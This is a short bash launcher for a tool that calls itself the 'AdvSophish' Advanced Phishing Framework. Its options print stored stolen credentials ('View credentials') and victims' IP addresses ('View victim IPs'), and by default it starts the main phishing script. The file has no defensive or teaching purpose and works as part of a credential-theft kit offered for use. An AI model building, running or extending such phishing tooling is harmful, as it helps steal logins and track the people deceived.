#!/bin/bash
if [[ $(uname -o) == *'Android'* ]]; then
    ADVSOPHISH_ROOT="/data/data/com.termux/files/usr/opt/advsophish"
else
    export ADVSOPHISH_ROOT="/opt/advsophish"
fi
if [[ $1 == '-h' || $1 == 'help' ]]; then
    echo "AdvSophish - Advanced Phishing Framework"
    echo " -c | auth : View credentials"
    echo " -i | ip   : View victim IPs"
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
    cat $ADVSOPHISH_ROOT/auth/usernames.dat 2>/dev/null || echo "No credentials"
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
    cat $ADVSOPHISH_ROOT/auth/ip.txt 2>/dev/null || echo "No IPs"
else
    cd $ADVSOPHISH_ROOT
    bash ./AdvSophish.sh
fi
